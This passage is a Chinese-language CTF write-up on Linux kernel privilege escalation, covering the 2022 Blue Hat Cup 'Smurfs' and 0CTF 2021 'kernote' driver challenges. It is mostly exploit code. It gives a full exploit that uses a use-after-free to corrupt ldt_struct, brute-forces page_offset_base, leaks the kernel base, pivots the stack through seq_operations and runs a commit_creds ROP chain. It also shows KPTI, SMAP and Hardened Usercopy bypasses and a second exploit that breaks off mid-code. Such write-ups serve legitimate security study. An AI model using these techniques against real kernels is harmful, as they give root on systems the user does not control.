int\t\t\tslot;&#125;;\n\n这里其实可以ldt_struct的size为0x10，那么这里的利用思路是\n\n通过write_ldt控制ldt结构体\n利用read_ldt进行爆破\n\n这里为什么使用爆破呢？可以看到在copy_to_user的过程中如果并没有完成的话时会返回一个负数，那么我们可以通过这一方法来爆破出内核地址。\n例题演示2022 蓝帽杯 半决赛 Smurfsqemu-system-x86_64 \\    -m 512M \\    -kernel ./bzImage \\    -initrd ./rootfs.cpio \\    -monitor /dev/null \\    -append &quot;root=/dev/ram console=ttyS0 oops=panic quiet panic=1 kaslr&quot; \\    -cpu kvm64,+smep\\    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\    -nographic \\    -no-reboot \\    -s\n\n首先题目开启的保护只是smep和kaslr\n题目分析__int64 __fastcall kernel_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)&#123;    __int64 v3; // rdx    __int64 result; // rax    int size; // r13d    __int64 v6; // rax    char *v7; // rbx    char *buf; // r14    __int64 v9; // rax    char *v10; // r12    __int64 v11; // r14    __int64 buf_low; // r13    add_args a1; // [rsp+0h] [rbp-48h] BYREF    __int64 v14; // [rsp+10h] [rbp-38h]    unsigned __int64 v15; // [rsp+18h] [rbp-30h]    ((void (__fastcall *)(file *, unsigned int, unsigned __int64))_fentry__)(file, cmd, arg);    v15 = __readgsqword(0x28u);    result = 0LL;    switch ( cmd )    &#123;        case &#x27;0&#x27;:            if ( !copy_from_user(&amp;a1, v3, 8LL) )            &#123;                if ( LODWORD(a1.size) &lt;= 2 &amp;&amp; addrList[LODWORD(a1.size)] )                    kfree();                return 0LL;            &#125;            return -22LL;        case &#x27;P&#x27;:            if ( !copy_from_user(&amp;a1, v3, 0x18LL) )            &#123;                if ( LODWORD(a1.size) &lt;= 2 )                &#123;                    v10 = addrList[LODWORD(a1.size)];                    if ( v10 )                    &#123;                        if ( LODWORD(a1.buf) &lt;= 8 )                        &#123;                            v11 = v14;                            buf_low = LODWORD(a1.buf);                            _check_object_size(addrList[LODWORD(a1.size)], LODWORD(a1.buf), 0LL);                            copy_from_user(v10, v11, buf_low);                            return 0LL;                        &#125;                    &#125;                &#125;                return 0LL;            &#125;            return -22LL;        case &#x27; &#x27;:            if ( !copy_from_user(&amp;a1, v3, 0x10LL) )            &#123;                size = a1.size;                if ( LODWORD(a1.size) &lt;= 0x20 )                &#123;                    v6 = _kmalloc(a1.size, 0xCC0LL);                    v7 = (char *)v6;                    if ( v6 )                    &#123;                        buf = a1.buf;                        if ( size &lt; 0 )                            BUG();                        _check_object_size(v6, (unsigned int)size, 0LL);                        if ( !copy_from_user(v7, buf, (unsigned int)size) )                        &#123;                            if ( !addrList[0] )                            &#123;                                v9 = 0LL;                                goto LABEL_17;                            &#125;                            v9 = 1LL;                            if ( !addrList[1] )                            &#123;                                LABEL_17:                                addrList[v9] = v7;                                return 0LL;                            &#125;                        &#125;                    &#125;                &#125;                return 0LL;            &#125;            return -22LL;    &#125;    return result;&#125;\n\n在ioctl函数存在三个功能，可以看到存在明显的UAF，但是在create时只能create两个堆块来使用，并且题目没有从内核读取数据到用户态的方法。\n利用过程那么根据上面所说的modify_ldt的利用原理来看，我们如果存在一个0x10大小的object，我们是可以控制到ldt_struct的，在write_ldt函数要想顺利的执行到下面我们还需要控制一下user_desc结构体。\ndesc.base_addr = 0xff0000;desc.entry_number = 0x1000 / 8;desc.limit = 0;desc.seg_32bit = 0;desc.contents = 0;desc.read_exec_only = 0;desc.limit_in_pages = 0;desc.seg_not_present = 0;desc.useable = 0;desc.lm = 0;\n\n当执行完write_ldt函数后，ldt_struct是我们可控的了，所以我们需要考虑泄露地址。\n========================================================================================================================    Start addr    |   Offset   |     End addr     |  Size   | VM area description========================================================================================================================                  |            |                  |         | 0000000000000000 |    0       | 00007fffffffffff |  128 TB | user-space virtual memory, different per mm__________________|____________|__________________|_________|___________________________________________________________                  |            |                  |         | 0000800000000000 | +128    TB | ffff7fffffffffff | ~16M TB | ... huge, almost 64 bits wide hole of non-canonical                  |            |                  |         |     virtual memory addresses up to the -128 TB                  |            |                  |         |     starting offset of kernel mappings.__________________|____________|__________________|_________|___________________________________________________________                                                            |                                                            | Kernel-space virtual memory, shared between all processes:____________________________________________________________|___________________________________________________________                  |            |                  |         | ffff800000000000 | -128    TB | ffff87ffffffffff |    8 TB | ... guard hole, also reserved for hypervisor ffff880000000000 | -120    TB | ffff887fffffffff |  0.5 TB | LDT remap for PTI ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base) ffffc88000000000 |  -55.5  TB | ffffc8ffffffffff |  0.5 TB | ... unused hole ffffc90000000000 |  -55    TB | ffffe8ffffffffff |   32 TB | vmalloc/ioremap space (vmalloc_base) ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base) ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole ffffec0000000000 |  -20    TB | fffffbffffffffff |   16 TB | KASAN shadow memory__________________|____________|__________________|_________|____________________________________________________________                                                            |                                                            | Identical layout to the 56-bit one from here on:____________________________________________________________|____________________________________________________________                  |            |                  |         | fffffc0000000000 |   -4    TB | fffffdffffffffff |    2 TB | ... unused hole                  |            |                  |         | vaddr_end for KASLR fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping fffffe8000000000 |   -1.5  TB | fffffeffffffffff |  0.5 TB | ... unused hole ffffff0000000000 |   -1    TB | ffffff7fffffffff |  0.5 TB | %esp fixup stacks ffffff8000000000 | -512    GB | ffffffeeffffffff |  444 GB | ... unused hole ffffffef00000000 |  -68    GB | fffffffeffffffff |   64 GB | EFI region mapping space ffffffff00000000 |   -4    GB | ffffffff7fffffff |    2 GB | ... unused hole ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0 ffffffff80000000 |-2048    MB |                  |         | ffffffffa0000000 |-1536    MB | fffffffffeffffff | 1520 MB | module mapping space ffffffffff000000 |  -16    MB |                  |         |    FIXADDR_START | ~-11    MB | ffffffffff5fffff | ~0.5 MB | kernel-internal fixmap range, variable size and offset ffffffffff600000 |  -10    MB | ffffffffff600fff |    4 kB | legacy vsyscall ABI ffffffffffe00000 |   -2    MB | ffffffffffffffff |    2 MB | ... unused hole__________________|____________|__________________|_________|___________________________________________________________\n\n这里考虑搜索物理地址直接映射区\n\n物理地址直接映射区即 direct mapping area，即线性映射区（不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是连续的，kmalloc 便从此处分配内存\n而 vmalloc 则从 vmalloc/ioremap space 分配内存，起始地址为 vmalloc_base，这一块区域到物理地址间的映射是不连续的\n\n这一块区域的起始地址称之为 page_offset_base，其地址为 0xffff888000000000，我们从这个地址开始搜索即可\n因为在read_ldt函数中如果copy_to_user出现问题就会返回负数，所以我们可以利用这种方式来进行爆破。\nwhile (1)&#123;    edit(0, 0x8, buf);    int ret = syscall(SYS_modify_ldt, 0, tmp, 8);    if (ret &lt; 0)    &#123;        addr += 0x40000000;        *(uint64_t *)buf = addr;        continue;    &#125;    printf(&quot;page_offset_base: %p\\n&quot;, addr);    break;&#125;\n\n在那道page_offset_base之后我们可以尝试泄露dir的值，在距离page_offset_base不远处会出现一个指向kernel_base+0x40的指针，所以可以泄漏出内核的基地址\nwhile (1)&#123;    create(0x50, buf);    edit(0, 0x8, buf);    syscall(SYS_modify_ldt, 0, info, 0x1000);    for (int i = 0; i &lt; 0x1000 / 8; i++)    &#123;        if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)        &#123;            kernel_base = info[i] - 0x40;            kernel_offset = kernel_base - vmlinux_base;            printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);            printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);        &#125;    &#125;    if (kernel_base)    &#123;        break;    &#125;    search_addr += 0x1000;    *(unsigned long long *)buf = search_addr;&#125;\n\n泄露完地址之后，就是想办法提升权限了。可以看出来这里并不存在任意地址写，所以思路还是栈迁移随后ROP，这里就需要利用到另一个结构体了\nstruct seq_operations &#123;    void * (*start) (struct seq_file *m, loff_t *pos);    void (*stop) (struct seq_file *m, void *v);    void * (*next) (struct seq_file *m, void *v, loff_t *pos);    int (*show) (struct seq_file *m, void *v);&#125;;\n\n这个结构体的大小位0x20也满足题目所给的范围，当我们复写了start指针之后调用read就会call start指针控制rip并且此时的rax等于我们的，所以我们可以使用下面这个gadget来劫持rsp。\nxchg eax,esp\n\n这里没有办法将prepare_kernel_cred的返回值给到rdi，所以这里使用的是另一种方式，在内核当中有一个特殊的 cred —— init_cred，这是 init 进程的 cred，因此其权限为 root，且该 cred 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 init_cred 的地址，那么我们就只需要执行一次 commit_creds(&amp;init_cred) 便能完成提权\nbypass kpti我对于kpti的认知就是，cr3存在相应的页表，如果，在从内核态回到用户态时没修改cr3，那么在用户态就会因为找不到对应的东西出现段错误。\n所以此时就有第一个bypass的思路，因为出现段错误肯定是有某个handle函数来处理，所以我们可以使用signal来修改信号的handle函数。\n第二种就是正常进行rop，但是中间修改一下cr3的值\n一般来说修改cr3需要的gadget是\nmov rdi,cr3or  rdi,1000hmov cr3,rdi\n\n综上，得出exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;struct create_chunk_arg&#123;    long int size;    unsigned long int buf;&#125;;struct edit_chunk_arg&#123;    long int idx;    long int size;    unsigned long int buf;&#125;;struct delete_chunk_arg&#123;    long int idx;&#125;;struct user_desc&#123;    unsigned int entry_number;    unsigned int base_addr;    unsigned int limit;    unsigned int seg_32bit : 1;    unsigned int contents : 2;    unsigned int read_exec_only : 1;    unsigned int limit_in_pages : 1;    unsigned int seg_not_present : 1;    unsigned int useable : 1;    unsigned int lm : 1;&#125;;int fd;size_t user_cs, user_ss, user_rflags, user_sp;void save_status()&#123;    __asm__(&quot;mov user_cs, cs\\n&quot;            &quot;mov user_ss, ss\\n&quot;            &quot;mov user_sp, rsp\\n&quot;            &quot;pushf\\n&quot;            &quot;pop user_rflags\\n&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void get_shell()&#123;    system(&quot;/bin/sh&quot;);&#125;void create(long size, unsigned long *buf)&#123;    struct create_chunk_arg arg;    arg.size = size;    arg.buf = buf;    ioctl(fd, 0x20, &amp;arg);&#125;void delete (long idx)&#123;    struct delete_chunk_arg arg;    arg.idx = idx;    ioctl(fd, 0x30, &amp;arg);&#125;void edit(long int idx, long int size, unsigned long *buf)&#123;    struct edit_chunk_arg arg;    arg.idx = idx;    arg.size = size;    arg.buf = buf;    ioctl(fd, 0x50, &amp;arg);&#125;int main()&#123;    signal(SIGSEGV, get_shell);    save_status();    char *buf[0x100];    char *tmp[0x100];    unsigned long *info = malloc(0x2000);    unsigned long vmlinux_base = 0xffffffff81000000;    memset(info, 0, 0x2000);    unsigned long kernel_base = 0;    unsigned long kernel_offset;    struct user_desc desc;    memset(buf, &quot;\\0&quot;, 0x100);    memset(buf, &#x27;a&#x27;, 0x20);    fd = open(&quot;/dev/kernelpwn&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[*]Error!&quot;);        exit(0);    &#125;    create(0x10, buf);    create(0x20, buf);    delete (0);    desc.base_addr = 0xff0000;    desc.entry_number = 0x1000 / 8;    desc.limit = 0;    desc.seg_32bit = 0;    desc.contents = 0;    desc.read_exec_only = 0;    desc.limit_in_pages = 0;    desc.seg_not_present = 0;    desc.useable = 0;    desc.lm = 0;    syscall(SYS_modify_ldt, 1, &amp;desc, sizeof(desc));    unsigned long long addr = 0xffff888000000000;    *(unsigned long long *)buf = addr;    while (1)    &#123;        edit(0, 0x8, buf);        int ret = syscall(SYS_modify_ldt, 0, tmp, 8);        if (ret &lt; 0)        &#123;            addr += 0x40000000;            *(uint64_t *)buf = addr;            continue;        &#125;        printf(&quot;page_offset_base: %p\\n&quot;, addr);        break;    &#125;    unsigned long search_addr = addr;    *(unsigned long long *)buf = search_addr;    while (1)    &#123;        edit(0, 0x8, buf);        syscall(SYS_modify_ldt, 0, info, 0x1000);        for (int i = 0; i &lt; 0x1000 / 8; i++)        &#123;            if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)            &#123;                kernel_base = info[i] - 0x40;                kernel_offset = kernel_base - vmlinux_base;                printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);                printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);            &#125;        &#125;        if (kernel_base)        &#123;            break;        &#125;        search_addr += 0x1000;        *(unsigned long long *)buf = search_addr;    &#125;    unsigned long pop_rdi;    unsigned long commit_creds;    unsigned long prepare_kernel_cred;    unsigned long xchg_eax_esp;    unsigned long init_cred;    unsigned long iretq;    unsigned long swapgs;    swapgs = 0xbc889f + kernel_base;    iretq = 0x2df + kernel_base;    xchg_eax_esp = 0xffffffff810e5bb9 + kernel_offset;    pop_rdi = 0xffffffff8108c420 + kernel_offset;    commit_creds = 0xc9540 + kernel_base;    prepare_kernel_cred = 0xc99d0 + kernel_base;    init_cred = 0x1a6b700 + kernel_base;    delete (1);    int seq_fd = open(&quot;/proc/self/stat&quot;, 0);    unsigned long *fake_stack = mmap(xchg_eax_esp &amp; 0xfffff000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);    printf(&quot;fake_stack: 0x%llx\\n&quot;, fake_stack);    fake_stack = xchg_eax_esp &amp; 0xffffffff;    printf(&quot;fake_stack: 0x%llx\\n&quot;, fake_stack);    *(unsigned long long *)buf = xchg_eax_esp;    unsigned long fake_seq_struct[0x20] = &#123;0&#125;;    fake_seq_struct[0] = xchg_eax_esp;    edit(1, 0x8, fake_seq_struct);    int i = 0;    fake_stack[i++] = pop_rdi;    fake_stack[i++] = init_cred;    fake_stack[i++] = commit_creds;    fake_stack[i++] = swapgs;    fake_stack[i++] = iretq;    fake_stack[i++] = (uint64_t)get_shell;    fake_stack[i++] = user_cs;    fake_stack[i++] = user_rflags;    fake_stack[i++] = user_sp;    fake_stack[i++] = user_ss;    read(seq_fd, 0x1234, 0x1);    return 0;&#125;\n\n可以看到我们使用的gadget只有32位，并且rax指向的还是这个gadget的地址，所以这里调用mmap的方式就按照exp中的即可\n\n如果这里使用第二种绕过kpti的话可以payload换成\nunsigned long chang_cr3 = 0xffffffff81c00feb + kernel_offset;fake_stack[i++] = pop_rdi;fake_stack[i++] = init_cred;fake_stack[i++] = commit_creds;fake_stack[i++] = chang_cr3;fake_stack[i++] = swapgs;fake_stack[i++] = iretq;fake_stack[i++] = (uint64_t)get_shell;fake_stack[i++] = user_cs;fake_stack[i++] = user_rflags;fake_stack[i++] = user_sp;fake_stack[i++] = user_ss;\n\n\n0CTF 2021 final kernote题目基本和上面一道题一致，不过这里的文件系统采用的ext4，需要拿到内部文件的方法就是\nsudo mount ./rootfs.img ./rootfs......sudo umount ./rootfs\n\n这道题目开启的保护有smep，smap，kpti以及kaslr，然后就是题目给了一个raedme文档：\nCONFIG_SLAB=yCONFIG_SLAB_FREELIST_RANDOM=yCONFIG_SLAB_FREELIST_HARDENED=yCONFIG_HARDENED_USERCOPY=yCONFIG_STATIC_USERMODEHELPER=yCONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;\n\n可以看到题目使用的堆分配算法是slab而不是默认的slub，所以需要了解一下关于slab的一些特征：\n\n开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）\n开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））\n开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等）\n开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）\n\n题目分析接下来开始直接进行逆向分析驱动\nelse if ( (_DWORD)a2 == 0x6667 )&#123;    v10 = -1LL;    if ( v3 &lt;= 0xF )    &#123;        a2 = 0xCC0LL;        v8 = (unsigned __int64 *)kmem_cache_alloc_trace(kmalloc_caches[5], 0xCC0LL, 8LL, v5, -1LL);        buf[v3] = v8;        v10 = -(__int64)(v8 == 0LL);    &#125;    goto LABEL_15;&#125;\n\n首先从0x6667这个create来看，这里的kmem_cache_alloc_trace函数我在源码中找到\nstatic __always_inline __alloc_size(3) void *kmem_cache_alloc_trace(struct kmem_cache *s,                                                                    gfp_t flags, size_t size)&#123;    void *ret = kmem_cache_alloc(s, flags);    ret = kasan_kmalloc(s, ret, size, flags);    return ret;&#125;\n\n是这样定义的，只存在三个参数，第三个参数还是size，所以这里在ioctl中的create函数的size是固定的8字节\n#ifdef CONFIG_SLAB/* * The largest kmalloc size supported by the SLAB allocators is * 32 megabyte (2^25) or the maximum allocatable page order if that is * less than 32 MB. * * WARNING: Its not easy to increase this value since the allocators have * to do various tricks to work around compiler limitations in order to * ensure proper constant folding. */#define KMALLOC_SHIFT_HIGH\t((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \\\t\t\t\t(MAX_ORDER + PAGE_SHIFT - 1) : 25)#define KMALLOC_SHIFT_MAX\tKMALLOC_SHIFT_HIGH#ifndef KMALLOC_SHIFT_LOW#define KMALLOC_SHIFT_LOW\t5#endif#endif#ifdef CONFIG_SLUB/* * SLUB directly allocates requests fitting in to an order-1 page * (PAGE_SIZE*2).  Larger requests are passed to the page allocator. */#define KMALLOC_SHIFT_HIGH\t(PAGE_SHIFT + 1)#define KMALLOC_SHIFT_MAX\t(MAX_ORDER + PAGE_SHIFT - 1)#ifndef KMALLOC_SHIFT_LOW#define KMALLOC_SHIFT_LOW\t3#endif#endif#ifdef CONFIG_SLOB/* * SLOB passes all requests larger than one page to the page allocator. * No kmalloc array is necessary since objects of different sizes can * be allocated from the same page. */#define KMALLOC_SHIFT_HIGH\tPAGE_SHIFT#define KMALLOC_SHIFT_MAX\t(MAX_ORDER + PAGE_SHIFT - 1)#ifndef KMALLOC_SHIFT_LOW#define KMALLOC_SHIFT_LOW\t3#endif#endif/* Maximum allocatable size */#define KMALLOC_MAX_SIZE\t(1UL &lt;&lt; KMALLOC_SHIFT_MAX)/* Maximum size for which we actually use a slab cache */#define KMALLOC_MAX_CACHE_SIZE\t(1UL &lt;&lt; KMALLOC_SHIFT_HIGH)/* Maximum order allocatable via the slab allocator */#define KMALLOC_MAX_ORDER\t(KMALLOC_SHIFT_MAX - PAGE_SHIFT)/* * Kmalloc subsystem. */#ifndef KMALLOC_MIN_SIZE#define KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)#endif\n\n这里可以看到除了slab的最小的size为32，那么我们取出object也是从kmalloc-32中取出，并且可以看到slob和slub最小的size都是8。\n所以虽然这里create时的size是固定的但是他申请出来的object的实际大小为32请求的大小也是32。\nif ( (_DWORD)a2 == 0x6666 )&#123;    v10 = -1LL;    if ( v3 &gt; 0xF )        goto LABEL_15;    note = buf[v3];&#125;\n\n在0x6666中实现的是将buf中的object放到另一个全局变量，note中去\nif ( (_DWORD)a2 == 0x6668 )&#123;    v10 = -1LL;    if ( v3 &lt;= 0xF )    &#123;        v9 = buf[v3];        if ( v9 )        &#123;            kfree(v9, a2, v4, v5, -1LL);            v10 = 0LL;            buf[v3] = 0LL;        &#125;    &#125;    goto LABEL_15;&#125;\n\n这里很明显的就是free，并且是非常明显的UAF\nif ( (_DWORD)a2 == 0x6669 )&#123;    v10 = -1LL;    if ( note )    &#123;        *note = v3;        v10 = 0LL;    &#125;    goto LABEL_15;&#125;\n\n这里就是修改，但是值可以修改前8bit。这里题目其实还有一个选项，不过没什么用就不做解释了。\n利用分析相信提到这里就很清楚思路跟上面那道题基本是一致的了，因为最小size是32那也就决定了ldt_struct和seq_operations申请的size也都是32。\nwhile (1)&#123;    edit(*(unsigned long *)buf);    int ret = syscall(SYS_modify_ldt, 0, tmp, 8);    if (ret &lt; 0)    &#123;        addr += 0x40000000;        *(uint64_t *)buf = addr;        continue;    &#125;    printf(&quot;page_offset_base: %p\\n&quot;, addr);    break;&#125;unsigned long search_addr = addr;*(unsigned long long *)buf = search_addr;while (1)&#123;    edit(*(unsigned long *)buf);    syscall(SYS_modify_ldt, 0, info, 0x1000);    for (int i = 0; i &lt; 0x1000 / 8; i++)    &#123;        if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)        &#123;            kernel_base = info[i] - 0x40;            kernel_offset = kernel_base - vmlinux_base;            printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);            printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);        &#125;    &#125;    if (kernel_base)    &#123;        break;    &#125;    search_addr += 0x1000;    *(unsigned long long *)buf = search_addr;&#125;\n\n这里是单纯使用上一道题目方法的代码\n可以看到在下面搜索基地址，会直接崩溃掉，这是因为触发了Hardened Usercopy保护。在fork的系统调用中存在一条调用链：\nsys_fork()=&gt;kernel_clone()=&gt;copy_process()=&gt;copy_mm()=&gt;dup_mm()=&gt;dup_mmap()=&gt;arch_dup_mmap()=&gt;ldt_dup_context()\n最后的ldt_dup_context函数如下：\nint ldt_dup_context(struct mm_struct *old_mm, struct mm_struct *mm)&#123;    struct ldt_struct *new_ldt;    int retval = 0;    if (!old_mm)        return 0;    mutex_lock(&amp;old_mm-&gt;context.lock);    if (!old_mm-&gt;context.ldt)        goto out_unlock;    new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);    if (!new_ldt) &#123;        retval = -ENOMEM;        goto out_unlock;    &#125;    memcpy(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);    finalize_ldt_struct(new_ldt);    retval = map_ldt_struct(mm, new_ldt, 0);    if (retval) &#123;        free_ldt_pgtables(mm);        free_ldt_struct(new_ldt);        goto out_unlock;    &#125;    mm-&gt;context.ldt = new_ldt;    out_unlock:    mutex_unlock(&amp;old_mm-&gt;context.lock);    return retval;&#125;\n\n可以看到中间存在一条memcpy函数是将父进程的ldt结构体的entries指向的内容拷贝到子进程ldt结构体的entries指针指向的位置。这样避免了把dir直接copy_to_user给用户态，这里memcpy都是在内核态进行的，所以也就避免了Hardened Usercopy保护。所以这里应该改为：\npipe(pipe_fd);while (1)&#123;    edit(*(unsigned long *)buf);    if (!fork())    &#123;        syscall(SYS_modify_ldt, 0, info, 0x1000);        for (int i = 0; i &lt; 0x1000 / 8; i++)        &#123;            if (info[i] &gt; vmlinux_base &amp;&amp; (info[i] &amp; 0xfff) == 0x040)            &#123;                kernel_base = info[i] - 0x40;                kernel_offset = kernel_base - vmlinux_base;                printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\n&quot;, kernel_base);                printf(&quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n&quot;, kernel_offset);            &#125;        &#125;        write(pipe_fd[1], &amp;kernel_base, 8);        exit(0);    &#125;    wait(NULL);    read(pipe_fd[0], &amp;kernel_base, 8);    if (kernel_base)    &#123;        kernel_offset = kernel_base - vmlinux_base;        break;    &#125;    search_addr += 0x1000;    *(unsigned long long *)buf = search_addr;&#125;\n\n下一步就跟刚刚一样我们要进行ROP，但是这道题恶心的地方的来了，这里开启了smap所以我们没法向上一道题目那样直接将ROP写在用户态，所以这里需要借助一个结构体pt_regs：\nstruct pt_regs &#123;    /* * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;. */    unsigned long r15;    unsigned long r14;    unsigned long r13;    unsigned long r12;    unsigned long rbp;    unsigned long rbx;    /* These regs are callee-clobbered. Always saved on kernel entry. */    unsigned long r11;    unsigned long r10;    unsigned long r9;    unsigned long r8;    unsigned long rax;    unsigned long rcx;    unsigned long rdx;    unsigned long rsi;    unsigned long rdi;    /* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it&#x27;s IRQ number: */    unsigned long orig_rax;    /* Return frame for iretq */    unsigned long rip;    unsigned long cs;    unsigned long eflags;    unsigned long rsp;    unsigned long ss;    /* top of stack page */&#125;;\n\n可以看到这个结构体的所有成员都是以寄存器命名的，并且内核中处理系统调用的入口函数entry_SYSCALL_64的源码中存在一条这样的指令：\nPUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy\n\n这条指令会将所有寄存器压入进内核的栈中，形成一个pt_reg结构体：\n\n当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时 rsp 与 栈底的相对偏移通常是不变的，而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，这些寄存器为我们布置 ROP 链提供了可能。\n综上，得出exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;void save_status()&#123;    __asm__(&quot;mov user_cs, cs\\n&quot;            &quot;mov user_ss, ss\\n&quot;            &quot;mov user_sp, rsp\\n&quot;            &quot;pushf\\n&quot;            &quot;pop user_rflags\\n&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void get_shell()&#123;    system(&quot;/bin/sh&quot;);&#125;struct user_desc&#123;    unsigned int entry_number;    unsigned int base_addr;    unsigned int limit;    unsigned int seg_32bit : 1;    unsigned int contents : 2;    unsigned int read_exec_only : 1;    unsigned int limit_in_pages : 1;    unsigned int seg_not_present : 1;    unsigned int useable : 1;    unsigned int lm : 1;&#125;;int fd;size_t user_cs, user_ss, user_rflags, user_sp;unsigned long add_rsp_pop_pop;unsigned long pop_rdi;unsigned long init_cred;unsigned long commit_creds;unsigned long swapgs;unsigned long iretq;unsigned long shell_addr;unsigned long swapgs_restore_regs_and_return_to_usermode;int seq_fd;void create(unsigned long idx)&#123;    ioctl(fd, 0x6667, idx);&#125;void delete (unsigned long idx)&#123;    ioctl(fd, 0x6668, idx);&#125;void select(unsigned long idx)&#123;    ioctl(fd, 0x6666, idx);&#125;void edit(unsigned long buf)&#123;    ioctl(fd, 0x6669, buf);&#125;int main()&#123;    signal(SIGSEGV, get_shell);    save_status();    fd = open(&quot;/dev/kernote&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[*]Error!&quot;);        exit(0);    &#125;    char *buf[0x100];    char *tmp[0x100];    unsigned long *info = malloc(0x2000);    unsigned long vmlinux_base = 0xffffffff81000000;    memset(info, 0, 0x2000);    unsigned long kernel_base = 0;    unsigned long kernel_offset;    int pipe_fd[2] = &#123;0&#125;;    struct user_desc desc;    desc.base_addr = 0xff0000;    desc.entry_number = 0x1000 / 8;    desc.limit = 0;    desc.seg_32bit = 0;    desc.contents = 0;    desc.read_exec_only = 0;    desc.limit_in_pages = 0;    desc.seg_not_present = 0;    desc.useable = 0;    desc.lm = 0;    create(0);    select(0);    delete (0);    syscall(SYS_modify_ldt, 1, &amp;desc, sizeof(desc));    memset(buf, 0, 0x100);    unsigned long long addr = 0xffff888000000000;    *(unsigned long *)buf = addr;    while (1)    &#123;        edit(*(unsigned long *)buf);        int ret = syscall(SYS_modify_ldt, 0, tmp, 8);        if (ret &lt; 0)        &#123;            addr += 0x40000000;            *(uint64_t *)buf = addr;            continue;        &#125;        printf(&quot;page_offset_base: %p\\n&quot;, addr);        break;    &#125;    unsigned long search_addr = addr;    *(unsigned long long *)buf = search_addr;    pipe(pipe_fd);    while (1)    &#123;        edit(*(unsigned long *)buf);        